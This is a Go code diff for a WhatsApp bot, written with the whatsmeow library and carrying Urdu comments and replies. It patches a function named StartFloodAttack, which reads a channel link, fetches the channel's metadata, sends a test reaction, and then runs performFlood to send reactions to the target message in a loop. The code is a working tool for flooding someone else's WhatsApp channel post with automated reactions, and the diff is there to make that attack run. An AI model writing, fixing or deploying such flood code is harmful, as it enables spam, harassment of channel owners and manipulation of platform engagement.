@@ -42,21 +42,20 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 
 	link := args[1]
 	parts := strings.Split(link, "/")
-	// لنک فارمیٹ: https://whatsapp.com/channel/CODE/ID
+	
 	if len(parts) < 2 {
 		replyToUser(client, userChat, "❌ غلط لنک۔")
 		return
 	}
 
-	// آئی ڈی اور کوڈ نکالنا
 	lastPart := parts[len(parts)-1]
-	msgID := strings.Split(lastPart, "?")[0] // صفائی
+	msgID := strings.Split(lastPart, "?")[0]
 	inviteCode := parts[len(parts)-2]
 
 	fmt.Printf("Debug: Invite=%s, MsgID=%s\n", inviteCode, msgID)
 	replyToUser(client, userChat, "🔍 چینل ڈیٹا اٹھا رہا ہوں...")
 
-	// 1. چینل کی معلومات (Metadata)
+	// 1. چینل کی معلومات
 	metadata, err := client.GetNewsletterInfoWithInvite(context.Background(), inviteCode)
 	if err != nil {
 		replyToUser(client, userChat, fmt.Sprintf("❌ چینل نہیں ملا: %v", err))
@@ -64,14 +63,16 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 	}
 
 	targetJID := metadata.ID
-	replyToUser(client, userChat, fmt.Sprintf("✅ چینل: %s\nID: %s\n ٹیسٹ شاٹ لے رہا ہوں...", metadata.ThreadMetadata.Name.Text, msgID))
-
-	// ---------------------------------------------------------
-	// 2. TEST SHOT (پہلے ایک ری ایکٹ چیک کریں)
-	// ---------------------------------------------------------
 	
-	// چینل میسجز میں FromMe ہمیشہ false ہوتا ہے
-	// RemoteJID چینل کی JID ہوتی ہے
+	// --- FIX IS HERE: metadata.Name.Text instead of ThreadMetadata ---
+	channelName := "Unknown"
+	if metadata.Name != nil {
+		channelName = metadata.Name.Text
+	}
+
+	replyToUser(client, userChat, fmt.Sprintf("✅ چینل: %s\nID: %s\n ٹیسٹ شاٹ لے رہا ہوں...", channelName, msgID))
+
+	// 2. TEST SHOT
 	testReaction := &waProto.Message{
 		ReactionMessage: &waProto.ReactionMessage{
 			Key: &waProto.MessageKey{
@@ -84,7 +85,6 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 		},
 	}
 
-	// ہم یہاں ایرر چیک کریں گے
 	resp, err := client.SendMessage(context.Background(), targetJID, testReaction)
 	if err != nil {
 		fmt.Println("Reaction Error:", err)
@@ -95,7 +95,7 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 	fmt.Println("Test Shot Success. Server ID:", resp.ID)
 	replyToUser(client, userChat, "✅ ٹیسٹ کامیاب! اب فلڈ کر رہا ہوں... 🚀")
 
-	// 3. اگر ٹیسٹ پاس ہو گیا، تو فلڈ کریں
+	// 3. FLOOD
 	performFlood(client, targetJID, msgID)
 	
 	replyToUser(client, userChat, "✅ مشن مکمل۔")
@@ -120,7 +120,6 @@ func performFlood(client *whatsmeow.Client, chatJID types.JID, msgID string) {
 					SenderTimestampMS: proto.Int64(time.Now().UnixMilli()), 
 				},
 			}
-			// یہاں اب بھی ایرر پرنٹ کروا لیتے ہیں تاکہ کنسول میں پتہ چلے
 			_, err := client.SendMessage(context.Background(), chatJID, reactionMsg)
 			if err != nil {
 				fmt.Printf("Flood Err %d: %v\n", idx, err)
